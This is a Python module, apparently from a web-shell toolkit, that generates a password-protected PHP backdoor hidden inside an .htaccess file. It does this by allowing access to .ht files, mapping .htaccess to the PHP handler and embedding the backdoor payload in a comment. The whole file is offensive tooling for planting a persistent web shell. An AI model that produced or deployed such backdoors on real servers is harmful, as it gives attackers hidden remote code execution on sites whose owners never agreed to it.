'''
Created on 22/ago/2011

@author: norby
'''

from modules.generate.php import Php as Phpgenerator
from core.backdoor import Backdoor

htaccess_template = '''<Files ~ "^\.ht">
    Order allow,deny
    Allow from all
</Files>

AddType application/x-httpd-php .htaccess
# %s #
'''

class Htaccess(Phpgenerator):
    """Generate backdoored .htaccess"""

    def _set_args(self):
        self.argparser.add_argument('pass', help='Password')
        self.argparser.add_argument('lpath', help='Path of generated backdoor', default= '.htaccess', nargs='?')

    def _prepare(self):
        
        self.args['encoded_backdoor'] = htaccess_template % Backdoor(self.args['pass']).backdoor.replace('\n', ' ')

        